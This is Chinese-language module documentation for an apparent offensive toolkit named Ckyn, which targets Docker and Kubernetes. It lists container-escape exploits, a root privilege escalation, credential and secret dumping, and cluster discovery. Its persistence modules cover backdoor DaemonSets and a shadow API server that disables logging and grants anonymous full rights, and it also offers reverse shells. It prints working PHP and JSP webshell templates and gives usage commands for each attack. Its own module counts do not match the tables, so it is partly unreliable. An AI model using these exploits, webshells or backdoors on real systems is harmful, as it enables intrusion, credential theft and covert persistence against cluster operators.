# Ckyn 模块分类文档

## 目录

- [一、安全评估模块 (Evaluate)](#一安全评估模块-evaluate)
- [二、漏洞利用模块 (Exploit)](#二漏洞利用模块-exploit)
  - [2.1 容器逃逸 (Escaping)](#21-容器逃逸-escaping)
  - [2.2 权限提升 (Privilege Escalation)](#22-权限提升-privilege-escalation)
  - [2.3 凭据访问 (Credential Access)](#23-凭据访问-credential-access)
  - [2.4 发现 (Discovery)](#24-发现-discovery)
  - [2.5 持久化 (Persistence)](#25-持久化-persistence)
  - [2.6 远程控制 (Remote Control)](#26-远程控制-remote-control)
- [三、内置工具 (Tool)](#三内置工具-tool)

---

## 一、安全评估模块 (Evaluate)

**命令：** `./ckyn evaluate [--full]`

### 1.1 信息收集

| 检查项 ID | 名称 | 说明 | Profile |
|-----------|------|------|---------|
| `information.system` | 系统信息 | 检测当前用户、操作系统、主机名 | basic, extended |
| `information.services` | 服务信息 | 检测敏感环境变量和运行中的服务进程 | basic, extended |
| `information.commands` | 命令和能力 | 检测可用 Linux 命令和 Capabilities | basic, extended |
| `information.mounts` | 挂载信息 | 检测挂载的文件系统和逃逸可能性 | basic, extended |
| `information.netns` | 网络命名空间 | 检测网络命名空间配置 | basic, extended |
| `information.sysctl` | Sysctl 变量 | 检测关键内核参数配置 | basic, extended |
| `information.dns` | DNS 服务发现 | DNS-based 服务发现 | basic, extended |
| `information.sensitive_files` | 敏感文件 | 扫描敏感文件路径 | extended, additional |
| `information.aslr` | ASLR | 检测 ASLR 配置 | extended, additional |
| `information.cgroups` | Cgroups | 检测 cgroup 版本和配置 | extended, additional |
| `information.security` | 容器安全 | 检测容器安全配置 | basic, extended |

### 1.2 发现

| 检查项 ID | 名称 | 说明 | Profile |
|-----------|------|------|---------|
| `discovery.k8s_api` | K8s API Server | 检测 K8s API Server 匿名登录 | basic, extended |
| `discovery.k8s_sa` | K8s Service Account | 检测 Service Account Token | basic, extended |
| `discovery.cloud_metadata` | 云元数据 API | 检测云服务商元数据 API | basic, extended |

### 1.3 漏洞预检

| 检查项 ID | 名称 | 说明 | Profile |
|-----------|------|------|---------|
| `exploit.kernel` | 内核漏洞 | 检测已知内核漏洞版本 | basic, extended |

### 1.4 支持的云服务商

| 云服务商 | 元数据 API |
|----------|-----------|
| 火山引擎 | `http://100.96.0.96/latest` |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance` |
| Google Cloud | `http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true` |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` |
| OpenStack | `http://169.254.169.254/openstack/latest/meta_data.json` |
| AWS | `http://169.254.169.254/latest/meta-data/` |
| UCloud | `http://100.80.80.80/meta-data/latest/uhost/` |

### 1.5 敏感文件扫描路径

| 路径 | 说明 |
|------|------|
| `/docker.sock` | Docker Socket |
| `/containerd.sock` | Containerd Socket |
| `/containerd/s/` | Containerd Shim Socket |
| `.kube/` | K8s 配置目录 |
| `.git/` | Git 仓库 |
| `.svn/` | SVN 仓库 |
| `.pip/` | Pip 配置 |
| `.bash_history` | Bash 历史 |
| `.ssh/` | SSH 密钥 |
| `.token` | Token 文件 |
| `/serviceaccount` | K8s Service Account |
| `.dockerenv` | Docker 环境标记 |

---

## 二、漏洞利用模块 (Exploit)

### 2.1 容器逃逸 (Escaping)

**目录：** `pkg/exploit/escaping/`

#### 基于配置缺陷

| Exploit 名称 | CVE | 说明 | 用法 |
|--------------|-----|------|------|
| `docker-sock-check` | - | 检测 Docker Socket 是否可用 | `ckyn run docker-sock-check <sock_path>` |
| `docker-sock-pwn` | - | 利用 Docker Socket 逃逸 | `ckyn run docker-sock-pwn <sock_path> <cmd>` |
| `docker-api-pwn` | - | 利用 Docker Remote API 逃逸 | `ckyn run docker-api-pwn <url> <cmd>` |
| `cap-dac-read-search` | - | 利用 CAP_DAC_READ_SEARCH 读取主机文件 | `ckyn run cap-dac-read-search` |
| `mount-cgroup` | - | 利用特权容器 cgroup 挂载逃逸 | `ckyn run mount-cgroup <cmd> [subsystem]` |
| `mount-device` | - | 利用设备挂载逃逸 | `ckyn run mount-disk` |
| `mount-procfs` | - | 利用 procfs 挂载逃逸 | `ckyn run mount-procfs <dir> <cmd>` |
| `rewrite-cgroup-devices` | - | 重写 cgroup devices.allow 逃逸 | `ckyn run rewrite-cgroup-devices` |
| `check-ptrace` | - | 检测 ptrace 注入可能性 | `ckyn run check-ptrace` |

#### 基于内核/运行时漏洞

| Exploit 名称 | CVE | 说明 | 用法 |
|--------------|-----|------|------|
| `runc-pwn` | CVE-2019-5736 | runc 容器逃逸 | `ckyn run runc-pwn <cmd>` |
| `shim-pwn` | CVE-2020-15257 | containerd shim 逃逸 | `ckyn run shim-pwn reverse <ip> <port>` |
| `abuse-unpriv-userns` | CVE-2022-0492 | 滥用非特权用户命名空间逃逸 | `ckyn run abuse-unpriv-userns <cmd>` |
| `cgroup2-ebpf-bypass` | - | cgroup2 eBPF 设备控制器绕过 | `ckyn run cgroup2-ebpf-bypass` |

#### 基于 LXCFS

| Exploit 名称 | CVE | 说明 | 用法 |
|--------------|-----|------|------|
| `lxcfs-rw` | - | 利用 LXCFS 读写 + mknod 逃逸 | `ckyn run lxcfs-rw` |
| `lxcfs-rw-cgroup` | - | 利用 LXCFS 读写 + cgroup 逃逸 | `ckyn run lxcfs-rw-cgroup` |

#### K8s 相关

| Exploit 名称 | CVE | 说明 | 用法 |
|--------------|-----|------|------|
| `k8s-kubelet-escape` | - | 利用 kubelet /var/log 逃逸 | `ckyn run k8s-kubelet-escape <endpoint> <token>` |
| `block-device-hint` | - | 块设备提示利用 | `ckyn run block-device-hint` |

---

### 2.2 权限提升 (Privilege Escalation)

**目录：** `pkg/exploit/privilege_escalation/`

| Exploit 名称 | CVE | 说明 | 用法 |
|--------------|-----|------|------|
| `copy-fail-cve-2026-31431` | CVE-2026-31431 | 本地权限提升（非 root → root）<br>通过 AF_ALG + splice 覆写 SUID 二进制的页缓存 | `ckyn run copy-fail-cve-2026-31431 [/usr/bin/su]` |

**CVE-2026-31431 详情：**
- **影响内核：** 4.14 - 6.x（2017年8月 至 2026年4月）
- **原理：** 利用 AF_ALG AEAD socket 的 in-place 优化缺陷，通过 splice 将攻击者控制的数据写入只读页缓存
- **效果：** 覆写 SUID 二进制（如 /usr/bin/su）的页缓存，执行后获得 root shell
- **注意：** 仅提升权限，不逃逸容器

---

### 2.3 凭据访问 (Credential Access)

**目录：** `pkg/exploit/credential_access/`

| Exploit 名称 | 说明 | 用法 |
|--------------|------|------|
| `ak-leakage` | 扫描目录查找 AK/Secrets | `ckyn run ak-leakage <dir>` |
| `etcd-get-k8s-token` | 从 etcd 获取 K8s token | `ckyn run etcd-get-k8s-token (anonymous\|default) <endpoint>` |
| `k8s-configmap-dump` | 导出 K8s ConfigMap | `ckyn run k8s-configmap-dump (auto\|<token-path>)` |
| `k8s-secret-dump` | 导出 K8s Secret | `ckyn run k8s-secret-dump (auto\|<token-path>)` |
| `registry-brute` | 镜像仓库暴力破解 | `ckyn run registry-brute <url> <user> <pass>` |

#### AK/Secrets 扫描规则

| 类型 | 正则表达式 |
|------|-----------|
| Slack Token | `(xox[p\|b\|o\|a]-[0-9]{12}-...)` |
| RSA 私钥 | `-----BEGIN RSA PRIVATE KEY-----` |
| SSH 私钥 | `-----BEGIN OPENSSH PRIVATE KEY-----` |
| DSA 私钥 | `-----BEGIN DSA PRIVATE KEY-----` |
| EC 私钥 | `-----BEGIN EC PRIVATE KEY-----` |
| PGP 私钥 | `-----BEGIN PGP PRIVATE KEY BLOCK-----` |
| AWS API Key | `AKIA[A-Z0-9]{16}` |
| GitHub Token | `[gG][iI][tT][hH][uU][bB].{0,30}['"\\s][0-9a-zA-Z]{35,40}['"\\s]` |
| Google OAuth | `("client_secret":\\s*?"[a-zA-Z0-9-_]{24}")` |
| Generic Secret | `[sS][eE][cC][rR][eE][tT].{0,30}['"\\s][0-9a-zA-Z]{32,45}['"\\s]` |
| Generic API Key | `[aA][pP][iI][_]?[kK][eE][yY].{0,30}['"\\s][0-9a-zA-Z]{32,45}['"\\s]` |
| Slack Webhook | `https://hooks\\.slack\\.com/services/T.../B.../...` |
| GCP Service Account | `"type": "service_account"` |
| Twilio API Key | `SK[a-z0-9]{32}` |
| URL 密码 | `[a-zA-Z]{3,10}://[^/\\s:@]{3,20}:[^/\\s:@]{3,20}@...` |

---

### 2.4 发现 (Discovery)

**目录：** `pkg/exploit/discovery/`

| Exploit 名称 | 说明 | 用法 |
|--------------|------|------|
| `k8s-cluster-info` | 枚举 K8s 集群信息 | `ckyn run k8s-cluster-info (auto\|<token-path>)` |
| `k8s-psp-dump` | 导出 K8s Pod Security Policy | `ckyn run k8s-psp-dump (auto\|<token-path>)` |
| `istio-check` | 检测是否在 Istio 服务网格中 | `ckyn run istio-check` |
| `service-probe` | 扫描子网发现 Docker/K8s 内部服务 | `ckyn run service-probe 192.168.1.0-255` |

---

### 2.5 持久化 (Persistence)

**目录：** `pkg/exploit/persistence/`

| Exploit 名称 | 说明 | 用法 |
|--------------|------|------|
| `webshell-deploy` | 部署 WebShell (PHP/JSP) | `ckyn run webshell-deploy (php\|jsp) <filepath>` |
| `k8s-backdoor-daemonset` | 部署后门 DaemonSet 到每个节点 | `ckyn run k8s-backdoor-daemonset (auto\|<token>) <image> <cmd>` |
| `k8s-cronjob` | 部署恶意 CronJob | `ckyn run k8s-cronjob (auto\|<token>) <schedule> <image> <args>` |
| `k8s-shadow-apiserver` | 部署影子 API Server（禁用日志，授予匿名用户全部权限） | `ckyn run k8s-shadow-apiserver (auto\|<token>)` |
| `k8s-mitm-clusterip` | CVE-2020-8554: 利用 ExternalIPs 进行 MITM 攻击 | `ckyn run k8s-mitm-clusterip (auto\|<token>) <image> <ip> <port>` |

#### WebShell 模板

**PHP:**
```php
<?php @eval($_POST['$SECRET_PARAM']);?>
```

**JSP:**
```jsp
<%Runtime.getRuntime().exec(request.getParameter("$SECRET_PARAM"));%>
```

---

### 2.6 远程控制 (Remote Control)

**目录：** `pkg/exploit/remote_control/`

| Exploit 名称 | 说明 | 用法 |
|--------------|------|------|
| `reverse-shell` | 反弹 Shell | `ckyn run reverse-shell <ip:port>` |
| `kubelet-exec` | 通过 kubelet API 执行命令 | `ckyn run kubelet-exec (list\|exec) <endpoint>/<ns>/<pod>/<container> <token>` |

---

## 三、内置工具 (Tool)

**目录：** `pkg/tool/`

| 工具 | 命令 | 说明 |
|------|------|------|
| kubectl | `ckyn kcurl <token> (get\|post) <url> [<data>]` | 请求 K8s API Server |
| etcdctl | `ckyn ectl <endpoint> get <key>` | 枚举 etcd 键 |
| dockerd_api | `ckyn ucurl (get\|post) <socket> <url> <data>` | 请求 Docker Unix Socket |
| dockerd_api | `ckyn dcurl (get\|post) <url>` | 请求 Docker TCP API |
| probe | `ckyn probe <ip> <port> <parallel> <timeout-ms>` | TCP 端口扫描 |

---

## 四、模块统计

| 类别 | 数量 | 说明 |
|------|------|------|
| 安全评估 | 15 项检查 | 涵盖系统、网络、K8s、云环境 |
| 容器逃逸 | 15 个 exploit | 覆盖 Docker、containerd、cgroup、LXCFS 等 |
| 权限提升 | 1 个 exploit | CVE-2026-31431 通杀提权 |
| 凭据访问 | 5 个 exploit | AK 扫描、etcd/secrets/configmap 导出 |
| 发现 | 4 个 exploit | K8s 枚举、服务探测、Istio 检测 |
| 持久化 | 5 个 exploit | WebShell、DaemonSet、CronJob、影子 API |
| 远程控制 | 2 个 exploit | 反弹 Shell、kubelet exec |
| 内置工具 | 5 个 | kubectl、etcd、docker API、端口扫描 |

---

## 五、命令速查

```bash
# 安全评估
./ckyn evaluate              # 基础评估
./ckyn evaluate --full       # 完整评估（含文件扫描）

# 列出所有 exploit
./ckyn run --list

# 运行 exploit
./ckyn run <exploit-name> [<args>...]

# 内置工具
./ckyn kcurl <token> get <url>
./ckyn ectl <endpoint> get <key>
./ckyn ucurl get <socket> <url>
./ckyn probe <ip> <port> <parallel> <timeout>
```
